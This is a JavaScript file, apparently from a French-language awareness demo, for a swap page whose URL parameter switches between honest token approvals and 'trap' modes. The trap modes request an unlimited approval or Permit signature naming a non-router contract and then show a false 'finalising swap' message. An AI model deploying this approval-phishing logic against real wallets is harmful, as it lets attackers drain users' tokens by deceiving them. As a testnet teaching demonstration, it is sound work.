// Logique de la page d'echange. Depend de chain-utils.js (charge avant).
//
// Un seul formulaire, un seul bouton. Deux versions du MEME site, choisies par ?mode= :
//   ?mode=honnete           -> approve de 50 DUSDC EXACTEMENT au routeur, puis l'echange
//   ?mode=habituel          -> approve ILLIMITE a SON PROPRE routeur (usage courant d'un site honnete), puis l'echange
//   ?mode=piege             -> approve ILLIMITE vers un contrat qui n'est pas le routeur
//   ?mode=piege&via=permit  -> signature Permit illimitee vers ce meme contrat
// Les deux demandes ont l'air normales pour un portefeuille : seule l'intention ecrite revele l'ecart.
//
// Regle d'affichage : aucun nom de fichier, aucune commande, aucun detail technique a l'ecran.
// Rien a l'ecran ne nomme le mode ni ne parle de la demo.
"use strict";

(function () {
  var $ = function (id) { return document.getElementById(id); };
  var AMOUNT_USDC = 50; // montant affiche et demande
  var addresses = null;
  var account = null;

  var params = new URL(location.href).searchParams;
  var MODE = (params.get("mode") || "honnete").toLowerCase();
  if (MODE !== "piege" && MODE !== "habituel") MODE = "honnete";
  var VIA = (params.get("via") || "").toLowerCase();

  function setState(text, cls) {
    var row = $("state");
    row.className = "state" + (cls ? " " + cls : "");
    row.querySelector(".text").textContent = text;
  }
  function setNet(text, cls) {
    var n = $("net");
    n.className = "net" + (cls ? " " + cls : "");
    $("net-text").textContent = text;
  }

  async function checkNet(p) {
    try {
      var c = await p.request({ method: "eth_chainId" });
      var ok = BigInt(c) === BigInt(addresses.chainId);
      setNet(ok ? "Réseau connecté" : "Mauvais réseau", ok ? "ok" : "bad");
      return ok;
    } catch (e) { setNet("Réseau inconnu", "bad"); return false; }
  }

  async function ensureChain(p) {
    var hex = toHex(addresses.chainId);
    var cur = await p.request({ method: "eth_chainId" });
    if (BigInt(cur) === BigInt(addresses.chainId)) return true;
    try {
      await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: hex }] });
      return true;
    } catch (err) {
      if (err && (err.code === 4902 || /unrecognized/i.test(err.message || ""))) {
        await p.request({
          method: "wallet_addEthereumChain",
          params: [{
            chainId: hex, chainName: isFuji(addresses.chainId) ? "Avalanche Fuji (testnet)" : "Chaîne locale de démo",
            nativeCurrency: { name: "Avalanche", symbol: "AVAX", decimals: 18 },
            rpcUrls: [addresses.rpcUrl], blockExplorerUrls: isFuji(addresses.chainId) ? [FUJI_EXPLORER] : [],
          }],
        });
        return true;
      }
      throw err;
    }
  }

  async function readNonce(p, owner) {
    try {
      var r = await p.request({ method: "eth_call", params: [{ to: addresses.usdc, data: callData("nonces(address)", [encAddr(owner)]) }, "latest"] });
      return BigInt(r).toString();
    } catch (e) { return "0"; }
  }

  async function doHonest(p) {
    setState("Confirmez l'autorisation de " + AMOUNT_USDC + " DUSDC.", "");
    await p.request({ method: "eth_sendTransaction", params: [txApproveRouter(addresses, account, AMOUNT_USDC)] });
    setState("Confirmez l'échange.", "");
    await p.request({ method: "eth_sendTransaction", params: [txSwap(addresses, account, AMOUNT_USDC)] });
    setState("Échange effectué. Vous avez reçu de l'AVAX.", "ok");
  }

  async function doHabituel(p) {
    // Site honnete : droit illimite a son propre routeur (usage par defaut de nombreux services),
    // puis l'echange de 50. Rien de malveillant a cette etape.
    if (!addresses.vulnRouter) { setState("Service momentanément indisponible. Merci de réessayer plus tard.", "bad"); return; }
    setState("Confirmez l'autorisation pour échanger.", "");
    await p.request({ method: "eth_sendTransaction", params: [txApproveVulnUnlimited(addresses, account)] });
    setState("Confirmez l'échange.", "");
    await p.request({ method: "eth_sendTransaction", params: [txSwapVuln(addresses, account, AMOUNT_USDC)] });
    setState("Échange effectué. Vous avez reçu de l'AVAX.", "ok");
  }

  async function doTrapApprove(p) {
    setState("Confirmez l'autorisation pour finaliser l'échange.", "");
    await p.request({ method: "eth_sendTransaction", params: [txApproveUnlimited(addresses, account)] });
    setState("Échange en cours de finalisation.", "ok");
  }

  async function doTrapPermit(p) {
    var nonce = await readNonce(p, account);
    var typed = buildPermit(addresses, account, nonce);
    setState("Signez pour finaliser l'échange (gratuit, sans transaction).", "");
    await p.request({ method: "eth_signTypedData_v4", params: [account, JSON.stringify(typed)] });
    setState("Échange en cours de finalisation.", "ok");
  }

  function run(p) {
    if (MODE === "piege") return VIA === "permit" ? doTrapPermit(p) : doTrapApprove(p);
    if (MODE === "habituel") return doHabituel(p);
    return doHonest(p);
  }

  $("btn-swap").addEventListener("click", async function () {
    var p = getProvider();
    if (!p) return;
    var btn = $("btn-swap");
    btn.disabled = true;
    try {
      if (!account) {
        setState("Connexion en cours.", "");
        var accts = await p.request({ method: "eth_requestAccounts" });
        account = accts[0];
        await ensureChain(p);
        await checkNet(p);
        $("acct").textContent = "Connecté : " + shortAddr(account);
        btn.textContent = "Échanger";
        setState("Prêt à échanger " + AMOUNT_USDC + " DUSDC contre de l'AVAX.", "");
        btn.disabled = false;
        return;
      }
      if (!(await checkNet(p))) { setState("Mauvais réseau. Reconnectez votre portefeuille.", "bad"); btn.disabled = false; return; }
      await run(p);
    } catch (err) {
      var cancelled = err && (err.code === 4001 || /user rejected|denied/i.test(err.message || ""));
      setState(cancelled ? "Opération annulée." : "Opération impossible pour le moment. Réessayez.", "bad");
      btn.disabled = false;
    }
  });

  async function init() {
    var res = await loadAddresses();
    if (!res.ok) {
      setNet("Service indisponible", "bad");
      $("btn-swap").textContent = "Indisponible pour le moment";
      setState("Service momentanément indisponible. Merci de réessayer plus tard.", "bad");
      return;
    }
    addresses = res.data;
    setTimeout(async function () {
      var p = getProvider();
      if (!p) {
        setNet("Aucun portefeuille", "bad");
        $("btn-swap").textContent = "Aucun portefeuille détecté";
        setState("Installez un portefeuille compatible, puis rechargez cette page.", "bad");
        return;
      }
      $("btn-swap").disabled = false;
      $("btn-swap").textContent = "Connecter le portefeuille";
      setState("Connectez votre portefeuille pour échanger.", "");
      await checkNet(p);
      try { p.on && p.on("chainChanged", function () { checkNet(p); }); } catch (e) {}
    }, 250);
  }

  init();
})();
